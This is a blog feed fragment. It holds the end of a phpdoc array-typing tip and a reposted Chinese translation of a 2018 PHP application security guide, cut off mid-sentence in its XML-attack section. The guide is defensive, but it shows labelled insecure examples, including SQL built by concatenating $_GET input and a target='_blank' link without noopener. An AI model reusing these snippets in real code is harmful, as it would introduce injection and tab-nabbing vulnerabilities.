&lt;h2 id=&quot;最佳解决方案&quot;&gt;&lt;a href=&quot;#最佳解决方案&quot; class=&quot;headerlink&quot; title=&quot;最佳解决方案&quot;&gt;&lt;/a&gt;最佳解决方案&lt;/h2&gt;&lt;p&gt;在JetBrains的PhpStorm IDE中，您可以使用&lt;code&gt;/** @var SomeObj[] */&lt;/code&gt;，例如：&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt; * &lt;span class=&quot;doctag&quot;&gt;@return&lt;/span&gt; SomeObj[]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getSomeObjects&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;...&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;a href=&quot;https://segmentfault.com/link.php?target=http%3A//phpdoc.org/docs/latest/references/phpdoc/types.html%23arrays&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;phpdoc documentation&lt;/a&gt;推荐这种方法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;specified containing a single type, the Type definition informs the reader of the type of each array element. Only one Type is then expected as element for a given array.&lt;/p&gt;
&lt;p&gt;Example: &lt;code&gt;@return int[]&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="php" scheme="http://www.twosee.cn/tags/php/"/>
    
      <category term="phpstorm" scheme="http://www.twosee.cn/tags/phpstorm/"/>
    
      <category term="ide" scheme="http://www.twosee.cn/tags/ide/"/>
    
  </entry>
  
  <entry>
    <title>[转] 2018 PHP 应用程序安全设计指北</title>
    <link href="http://www.twosee.cn/2018/01/06/php-app-security/"/>
    <id>http://www.twosee.cn/2018/01/06/php-app-security/</id>
    <published>2018-01-05T17:33:18.000Z</published>
    <updated>2018-04-05T08:44:44.412Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>The 2018 Guide to Building Secure PHP Software！</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2018 年将至，一般程序员（特别是 Web 开发程序员）应当抛弃过去开发PHP程序的很多不好的习惯和观念了。虽然部分人不以为意，但是这确实是事实。</p><p>这个指南应该以重点部分作为 <a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.phptherightway.com%2F" target="_blank" rel="noopener">PHP: The Right Way</a> 安全章节的补充，而不是以一般的 PHP 编程话题。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h2 id="PHP-版本"><a href="#PHP-版本" class="headerlink" title="PHP 版本"></a>PHP 版本</h2><blockquote><p>请在 2018 年使用 PHP 7.2, 并且计划 2019 年初切换到 PHP 7.3。</p></blockquote><p>PHP 7.2 已于 2017 年 11 月 30 日发布。</p><p>写这篇文章的时候，只有 7.1 和 7.2 版本还在被 PHP 官方积极维护，而 5.6 和 7.0 只在大概1年内提供安全补丁更新。</p><p>对于其他官方不维护的 PHP 版本，虽然某些操作系统会提供长期支持和维护，但这其实通常是有害的。尤其是他们提供安全支持补丁却没有版本号，这使得很难解释系统的安全性（仅仅知道 PHP 版本）。</p><p>因此，无论其他供应商提出了什么承诺，如果可以，你就应该在任何时候都坚决地使用<a href="https://link.juejin.im/?target=http%3A%2F%2Fphp.net%2Fsupported-versions.php" target="_blank" rel="noopener">官方提供支持的 PHP 版本</a>。这样，尽管最终是一个短暂的安全版本，但一个不断致力于升级的版本，总会让你收获一些意外的惊喜。</p><a id="more"></a><h2 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h2><blockquote><p>人生苦短，我用 Composer</p></blockquote><p>在 PHP 生态中，<a href="https://link.juejin.im/?target=https%3A%2F%2Fgetcomposer.org%2F" target="_blank" rel="noopener">Composer</a> 是最先进的依赖管理方案。我们推荐 PHP: The Right Way 中关于<a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.phptherightway.com%2F%23dependency_management" target="_blank" rel="noopener">依赖管理</a>的完整章节。</p><p>如果你没有使用 Composer 来管理应用的依赖，最终（hopefully later but most likely sooner）会导致应用里某个依赖会严重过时，然后老旧版本中的漏洞会被利用于计算机犯罪。</p><p><strong>重要</strong>： 开发软件时，时常记得<a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.phptherightway.com%2F%23updating-your-dependencies" target="_blank" rel="noopener">保持依赖的更新</a>。幸运地，这只需一行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><p>如果你正在使用某些专业的，需要使用 PHP 扩展（C 语言编写），那你不能使用 Composer 管理，而需要 PECL 。</p><h3 id="推荐扩展"><a href="#推荐扩展" class="headerlink" title="推荐扩展"></a>推荐扩展</h3><p>不管你正在编写什么，你总会受益于这些依赖。这是除了大多数 PHP 程序员的推荐（PHPUnit, PHP-CS-Fixer, …）外的补充。</p><p><strong>roave/security-advisories</strong></p><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2FRoave%2FSecurityAdvisories" target="_blank" rel="noopener">Roave’s security-advisories</a> 使用 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2FFriendsOfPHP%2Fsecurity-advisories" target="_blank" rel="noopener">Friends of PHP repository</a> 确保你的项目没有依赖一些已知易受攻击的依赖。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require roave/security-advisories:dev-master</span><br></pre></td></tr></table></figure><p>或者，你可以<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2FFriendsOfPHP%2Fsecurity-advisories%23checking-for-vulnerabilities" target="_blank" rel="noopener">上传你的<code>composer.lock</code>文件到 Sensio Labs </a>，作为例行自动化漏洞评估工作流的一部分，以提醒发现任何过时的软件包。</p><p><strong>vimeo/psalm</strong></p><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fvimeo%2Fpsalm" target="_blank" rel="noopener">Psalm </a>是一个帮助你识别代码里可能存在 bugs 的静态分析工具。还有其他很好的静态分析工具（例如 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fphan%2Fphan" target="_blank" rel="noopener">Phan</a> 和 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fphpstan%2Fphpstan" target="_blank" rel="noopener">PHPStan</a> 都很棒），但当你发现你需要支持 PHP 5，Psalm 将是 PHP 5.4+ 的首选。</p><p>使用 Psalm 挺简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Version 1 doesn't exist yet, but it will one day:</span></span><br><span class="line">composer require --dev vimeo/psalm:^0</span><br><span class="line"></span><br><span class="line"><span class="comment"># Only do this once:</span></span><br><span class="line">vendor/bin/psalm --init</span><br><span class="line"></span><br><span class="line"><span class="comment"># Do this as often as you need:</span></span><br><span class="line">vendor/bin/psalm</span><br></pre></td></tr></table></figure><p>如果你是第一次在现有代码库运行，可能会看到很多红色错误。但除非你在构建像 WordPress 那么大的程序，否则努力通过所有测试绝不是艰巨的。</p><p>无论使用哪种静态分析工具，我们都推荐你能将他加入到<a href="https://link.juejin.im/?target=https%3A%2F%2Fzh.wikipedia.org%2Fwiki%2F%25E6%258C%2581%25E7%25BA%258C%25E6%2595%25B4%25E5%2590%2588" target="_blank" rel="noopener">持续集成工作流</a>（Continuous Integration workflow）中，以便在每次更改代码中运行。</p><h2 id="HTTPS-和浏览器安全"><a href="#HTTPS-和浏览器安全" class="headerlink" title="HTTPS 和浏览器安全"></a>HTTPS 和浏览器安全</h2><blockquote><p>HTTPS, <a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.ssllabs.com%2F" target="_blank" rel="noopener">which should be tested</a>, and <a href="https://link.juejin.im/?target=https%3A%2F%2Fsecurityheaders.io%2F" target="_blank" rel="noopener">security headers</a> .</p></blockquote><p>2018 年，不安全的 HTTP 网站将不再被接受。幸运的是，由于 ACME 协议 和 <a href="https://link.juejin.im/?target=https%3A%2F%2Fletsencrypt.org%2F" target="_blank" rel="noopener">Let’s Encrypt certificate authority</a>，免费的 TLS 证书成为了可能。</p><p>将 ACME 集成到你的服务器，小菜一碟。</p><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fcaddyserver.com%2F" target="_blank" rel="noopener">Caddy</a>: 自动加入。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fletsencrypt.org%2F2017%2F10%2F17%2Facme-support-in-apache-httpd.html" target="_blank" rel="noopener">Apache</a>: 很快作为<code>mod_md</code>可用。在此之前，<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.digitalocean.com%2Fcommunity%2Ftutorials%2Fhow-to-secure-apache-with-let-s-encrypt-on-ubuntu-16-04" target="_blank" rel="noopener">网上很多高质量教程</a>。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.nginx.com%2Fblog%2Fusing-free-ssltls-certificates-from-lets-encrypt-with-nginx%2F" target="_blank" rel="noopener">Nginx</a>: 相对简单。</li></ul><p>你也许会想，“好，我已经有 TLS 证书了，为了网站变得安全和快速，得花些时间折腾配置信息。”</p><p><strong>不！</strong><a href="https://link.juejin.im/?target=https%3A%2F%2Fmozilla.github.io%2Fserver-side-tls%2Fssl-config-generator%2F" target="_blank" rel="noopener">Mozilla做了件好事情！</a>。你可以根据网站的目标受众，使用配置生成器生成<a href="https://link.juejin.im/?target=https%3A%2F%2Fwiki.mozilla.org%2FSecurity%2FServer_Side_TLS" target="_blank" rel="noopener">推荐套件</a>。</p><p>如果你希望网站安全，HTTPS ( HTTP over TLS ) 是<a href="https://link.juejin.im/?target=https%3A%2F%2Fstackoverflow.com%2Fa%2F2336738%2F2224584" target="_blank" rel="noopener">绝对不能妥协</a>的。使用 HTTPS 立刻就能消除多种攻击（中间人攻击、窃听、重放攻击以及若干允许用户模仿的会话形式的攻击）。</p><h3 id="安全头"><a href="#安全头" class="headerlink" title="安全头"></a>安全头</h3><p>在服务器使用 HTTPS 确实为用户提供了许多安全性和性能方面的好处，但也还能通过利用某些浏览器的安全功能来进一步提升安全性。而这大部分会涉及到响应内容的安全头。</p><ul><li><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span></span><br></pre></td></tr></table></figure><ul><li>你需要该 Header ，因为它提供了对于浏览器是否允许加载内部和外部资源的细化控制，从而为跨域脚本攻击漏洞提供了有效防御层。</li><li>参阅 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fcsp-builder" target="_blank" rel="noopener">CSP-Builder</a>，以便快速简便地部署/管理内容安全策略（Content Security Policies）。</li><li>为了更加深入的分析， Scott Helme’s <a href="https://link.juejin.im/?target=https%3A%2F%2Fscotthelme.co.uk%2Fcontent-security-policy-an-introduction%2F" target="_blank" rel="noopener">introduction to Content-Security-Policy headers</a>，会是一个很好的引导。</li></ul></li><li><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Expect-CT</span></span><br></pre></td></tr></table></figure><ul><li>你需要该 Header ，因为它能通过强制某些不良行为者将其错误证书的证据颁发到可公开验证的仅可追加的数据结构，从而针对流氓/受损的证书颁发机构增加一层防护。</li><li>优先设置为<code>enforce,max-age=30</code>。只要你有足够的自信该 Header 不会造成服务中断，增加<code>max-age</code>吧。</li></ul></li><li><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referrer-Policy</span></span><br></pre></td></tr></table></figure><ul><li>你需要该 Header ，因为它允许你控制用户的行为信息是否泄露给第三方。</li><li>同样地，Scott Helme 提供了<a href="https://link.juejin.im/?target=https%3A%2F%2Fscotthelme.co.uk%2Fa-new-security-header-referrer-policy%2F" target="_blank" rel="noopener">一篇关于Referrer-Policy Header 介绍好文</a>。</li><li>除非有理由允许更加宽松的设置，否则请设置为<code>same-origin</code>或<code>no-referrer</code>。</li></ul></li><li><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Strict-Transport-Security</span></span><br></pre></td></tr></table></figure><ul><li>你需要该 Header ，因为它告诉浏览器通过 HTTPS 而不是不安全的 HTTP ，将 future requests 设为同源。</li><li>在第一次部署时，将其设置为<code>max-age = 30</code>，然后当你确信没有任何内容会中断时，将此值增加到某个较大的值（例如 31536000）。</li></ul></li><li><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Content-Type-Options</span></span><br></pre></td></tr></table></figure><ul><li>你需要该 Header ，因为 MIME 类型的混淆可能会导致不可预知的结果，包括奇怪的允许 XSS 漏洞的边缘情况。这最好伴随着一个标准的 Content-Type Header 。</li><li>除非需要默认的行为（例如文件的下载），否则请设置为<code>nosniff</code>。</li></ul></li><li><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Frame-Options</span></span><br></pre></td></tr></table></figure><ul><li>你需要该 Header ，因为它允许你防止点击劫持。</li><li>设置为<code>DENY</code> (或者<code>SAMEORIGIN</code>, 但仅仅当你使用<code>&lt;frame&gt;</code>元素的时候)。</li></ul></li><li><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-XSS-Protection</span></span><br></pre></td></tr></table></figure><ul><li>你需要该 Header ，因为它启用了一些默认情况下未启用的浏览器反 XSS 功能。</li><li>设置为<code>1; mode=block</code>。</li></ul></li></ul><p>同样，如果你使用 PHP 的内置会话管理功能（建议使用），则可能需要这样调用<code>session_start()</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start([</span><br><span class="line">    <span class="string">'cookie_httponly'</span> =&gt; <span class="keyword">true</span>,</span><br><span class="line">    <span class="string">'cookie_secure'</span> =&gt; <span class="keyword">true</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure><p>这会强制你的应用在发送会话标识符时使用 HTTP-Only 和 Secure 标志，从而防止 XSS 攻击窃取用户的 Cookie ，并强制它们分别通过 HTTPS 发送。 我们之前在 2015 年的博客文章中介绍了<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F04%2Ffast-track-safe-and-secure-php-sessions" target="_blank" rel="noopener">安全的 PHP 会话</a>。</p><h3 id="子资源完整性"><a href="#子资源完整性" class="headerlink" title="子资源完整性"></a>子资源完整性</h3><p>在将来的某个时候，你也许会使用 CDN 来加载网站的公共 JavaScript/CSS 库。安全工程师已经遇见了这存在一个明显的风险，如果很多网站使用 CDN 提供内容，Hack 和替换 CDN（获得了 CDN 的控制权）就可以注入（恶意）代码到成千上万的网站。</p><p>查阅<a href="https://link.juejin.im/?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSecurity%2F%25E5%25AD%2590%25E8%25B5%2584%25E6%25BA%2590%25E5%25AE%258C%25E6%2595%25B4%25E6%2580%25A7" target="_blank" rel="noopener">子资源完整性</a>吧。</p><p>子资源完整性（SRI，Subresource integrity）允许你将希望 CDN 服务的文件的内容进行哈希处理。目前实行的 SRI 只允许使用安全的密码散列函数，这意味着攻击者不可能生成与原始文件哈希相同的恶意版本资源。</p><p>一个真实例子: <a href="https://link.juejin.im/?target=https%3A%2F%2Fv4-alpha.getbootstrap.com%2F" target="_blank" rel="noopener">Bootstrap v4-alpha uses SRI in their CDN example snippet</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span></span></span><br><span class="line"><span class="tag">    <span class="attr">rel</span>=<span class="string">"stylesheet"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">integrity</span>=<span class="string">"sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">integrity</span>=<span class="string">"sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="文档关系"><a href="#文档关系" class="headerlink" title="文档关系"></a>文档关系</h3><p>Web 开发人员经常在超链接上设置目标属性（例如，<code>target =&quot;_ blank&quot;</code>在新窗口中打开链接）。但是，如果你没有传递<code>rel =&quot;noopener&quot;</code>标签，则可以<a href="https://link.juejin.im/?target=https%3A%2F%2Fmathiasbynens.github.io%2Frel-noopener%2F" target="_blank" rel="noopener">允许目标页面控制当前页面</a>。</p><p>不要这样做：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>Click here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这会让<code>http://example.com</code>页面能控制当前页面。</p><p>而应该这样做：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://example.com"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">rel</span>=<span class="string">"noopener noreferrer"</span>&gt;</span>Click here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过这样在新窗口打开<code>https://example.com</code>，当前窗口的控制权也不会授予可能的恶意第三方。</p><p>可以更加<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.jitbit.com%2Falexblog%2F256-targetblank---the-most-underestimated-vulnerability-ever" target="_blank" rel="noopener">深入研究</a>。</p><h2 id="开发安全的-PHP-程序"><a href="#开发安全的-PHP-程序" class="headerlink" title="开发安全的 PHP 程序"></a>开发安全的 PHP 程序</h2><p>如果应用程序安全性对你来说是一个新话题，请从<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F08%2Fgentle-introduction-application-security" target="_blank" rel="noopener">应用程序安全性简介</a>开始吧。</p><p>大多数安全专家指出，开发者可以使用 <a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2017-Top_10" target="_blank" rel="noopener">OWASP Top 10</a> 等资源开始着手。</p><p>但是，大多数常见的漏洞也可以是相同高等级的安全问题（例如代码和数据没有完全分离、逻辑不严谨和健全、操作环境不安全或是可破译的密码协议等）。</p><p>我们的假设是，应该授予安全新手知道一些更简单、基础的安全知识和问题，并如何解决这些问题，应该是一个更好的、长远的安全工程。</p><p>因此，<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F04%2Fchecklist-driven-security-considered-harmful" target="_blank" rel="noopener">我们避免推荐十大或二十大安全清单</a>。</p><h3 id="数据库注入"><a href="#数据库注入" class="headerlink" title="数据库注入"></a>数据库注入</h3><blockquote><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F05%2Fpreventing-sql-injection-in-php-applications-easy-and-definitive-guide" target="_blank" rel="noopener">避免 PHP 程序存在 SQL 注入。</a></p></blockquote><p>如果你是自己编写 SQL 代码，请确保使用<code>prepared</code>语句，并且从网络或文件系统提供的信息都作为参数传递，而不是字符串拼接的形式。此外，确保你<a href="https://link.juejin.im/?target=https%3A%2F%2Fstackoverflow.com%2Fa%2F12202218" target="_blank" rel="noopener">没有使用模拟的prepared语句</a>。</p><p>为了达到好的效果，可以使用 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Feasydb" target="_blank" rel="noopener">EasyDB</a> 。</p><p>不要这样做：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Insecure code: */</span></span><br><span class="line">$query = $pdo-&gt;query(<span class="string">"SELECT * FROM users WHERE username = '"</span> . $_GET[<span class="string">'username'</span>] . <span class="string">"'"</span>);</span><br></pre></td></tr></table></figure><p>应该这样做：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Secure against SQL injection: */</span></span><br><span class="line">$results = $easydb-&gt;row(<span class="string">"SELECT * FROM users WHERE username = ?"</span>, $_GET[<span class="string">'username'</span>]);</span><br></pre></td></tr></table></figure><p>还有其他数据库抽象层提供了相同的安全性（EasyDB实际上是在使用 PDO ，但在实际的<code>prepare</code>语句前避免了<code>prepared</code>语句模拟）。 只要用户输入不会影响查询的结构，就很安全（包括存储过程）。</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote><p>深入：<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F10%2Fhow-securely-allow-users-upload-files" target="_blank" rel="noopener">如何安全地允许用户上传文件？</a></p></blockquote><p>接受文件上传是一个冒险的提议，但只要采取一些基本的预防措施，是能保证安全的。也就是说，允许文件直接上传的话，这些文件可能会被意外的允许执行或解释。上传的文件应该是只读（read-only）或读写（read-write）的，永远不应该可执行（executable）。</p><p>如果你的网站根目录是<code>/var/www/example.com</code>，请不要保存上传文件在<code>/var/www/example.com/uploaded_files</code>。</p><p>而应该保存到一个不能直接访问的目录（例如：<code>/var/www/example.com-uploaded/</code>），以免意外地将其作为服务器端脚本执行，并获得执行远程代码的后门。</p><p>一个更加简洁的方法是将网站根目录往下移动一个层级（即：<code>/var/www/example.com/public</code>）。</p><p>如何安全地下载这些上传文件也是一个问题。</p><ul><li>直接访问 SVG 图像类型时，将在用户浏览器执行 JavaScript 代码。尽管<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fw3c%2Fsvgwg%2Fissues%2F266" target="_blank" rel="noopener">它的MIME类型中的<code>image/</code>前缀具有误导性</a>，但是这是正确的。</li><li>正如前面提及的，MIME 类型嗅探可能导致类型混淆攻击。请参阅<a href="https://juejin.im/post/5a4115cc518825256362e934?utm_source=coffeephp.com&amp;from=singlemessage&amp;isappinstalled=1#%E5%AE%89%E5%85%A8%E5%A4%B4" target="_blank" rel="noopener">X-Content-Type-Options</a>。</li><li>如果你放弃前面关于如何安全地存储上传文件的建议，攻击者就会通过上传 .php 或 .phtml 文件，直接在浏览器中访问文件来执行任意代码，从而完全控制服务器。</li></ul><h3 id="跨站脚本"><a href="#跨站脚本" class="headerlink" title="跨站脚本"></a>跨站脚本</h3><blockquote><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F06%2Fpreventing-xss-vulnerabilities-in-php-everything-you-need-know" target="_blank" rel="noopener">关于 PHP 中的跨站脚本攻击，你想知道的都在这里</a></p></blockquote><p>同样地，预防 XSS 和 SQL 注入是一样简单的。我们有简单而易用的 API 来分离文档结构（structure of a document）和填充的数据。</p><p>然而，实际上还有很多 Web 开发程序员仍是通过生成一大串 HTML 代码作为响应的形式开发。并且，这不是 PHP 独有的现实，这是所有 Web 开发程序员都应该重视的。</p><p>减少 XSS 漏洞不失为一个好方法。总之，前面谈及的<a href="https://juejin.im/post/5a4115cc518825256362e934?utm_source=coffeephp.com&amp;from=singlemessage&amp;isappinstalled=1#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8" target="_blank" rel="noopener">浏览器安全的章节</a>就显得十分相关了。简言之：</p><ul><li>尽量避免输出和输入（<code>Always escape on output, never on input</code>）。如果你把已清洗的数据（sanitized data）保存在数据库，然后在其它地方被发现了 SQL 注入漏洞，攻击者将通过恶意程序污染这些受信任的已清洗数据（trusted-to-be-sanitized record），从而绕开 XSS 保护。</li><li>如果你的框架有一个提供自动上下文过滤的模板引擎，那就使用它吧。这些工作可由框架安全地做到。</li><li><code>echo htmlentities（$ string，ENT_QUOTES | ENT_HTML5，&#39;UTF-8&#39;）</code> 是一种安全、有效的方法阻止UTF-8编码的网页上的所有 XSS 攻击，但不是任何 HTML 都有效。</li><li>如果你的环境要求你使用 Markdown 而不是 HTML ，那就不要使用 HTML 了。</li><li>如果你需要使用原生 HTML（没有使用模板引擎），参阅第一点，并且使用 <a href="https://link.juejin.im/?target=http%3A%2F%2Fhtmlpurifier.org%2F" target="_blank" rel="noopener">HTML Purifier</a> 吧。HTML Purifier 不适合转义为 HTML 属性上下文（HTML attribute context）。</li></ul><h3 id="跨站请求伪造"><a href="#跨站请求伪造" class="headerlink" title="跨站请求伪造"></a>跨站请求伪造</h3><p>跨站请求伪造（CSRF）是一种混淆的代理攻击，通过诱导用户的浏览器代表攻击者执行恶意的 HTTP 请求（使用的是该用户的权限）。</p><p>这在一般情况下是很容易解决的，只需两步：</p><ul><li>使用 HTTPS 。这是先决条件。没有 HTTPS 的话，任何保护措施都是脆弱的，虽然 HTTPS 本身并不防御 CSRF 。</li><li>增加基本的 Challenge-response authentication。<ul><li>为每个表单添加一个隐藏的表单属性。</li><li>填充一个密码安全的随机值（称为令牌）。</li><li>验证是否提供了隐藏的表单属性，以及是否匹配上期望值。</li></ul></li></ul><p>我们写了一个名为 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fanti-csrf" target="_blank" rel="noopener">Anti-CSRF</a> 的库，并且：</p><ul><li>你可以使每个令牌只能使用一次，以防止重放攻击。<ul><li>多个令牌存储在后端。</li><li>一旦令牌获取完，令牌会循环使用。</li></ul></li><li>每个令牌可以绑定特定的 URL 。<ul><li>如果某个令牌泄露了，它不能在不同的上下文使用。</li></ul></li><li>令牌可以绑定特定的 IP 地址。</li><li>v2.1 后，令牌可以重复使用（例如供 Ajax 使用）。</li></ul><p>如果你没有使用防止 CSRF 漏洞的框架，请将 Anti-CSRF 放在一边。在不久的将来，<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.sjoerdlangkemper.nl%2F2016%2F04%2F14%2Fpreventing-csrf-with-samesite-cookie-attribute%2F" target="_blank" rel="noopener">SameSite cookies将允许我们更简单地避免CSRF攻击</a>。</p><h3 id="XML-攻击-XXE-XPath-Injection"><a href="#XML-攻击-XXE-XPath-Injection" class="headerlink" title="XML 攻击 (XXE, XPath Injection)"></a>XML 攻击 (XXE, XPath Injection)</h3><p>在处理大量 XML 的应用程序中存在两个主要的漏洞：</p><ul><li>XML External Entities (XXE)</li><li>XPath 注入</li></ul><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FXML_External_Entity_(XXE" target="_blank" rel="noopener">除此之外</a>_Processing)， XXE 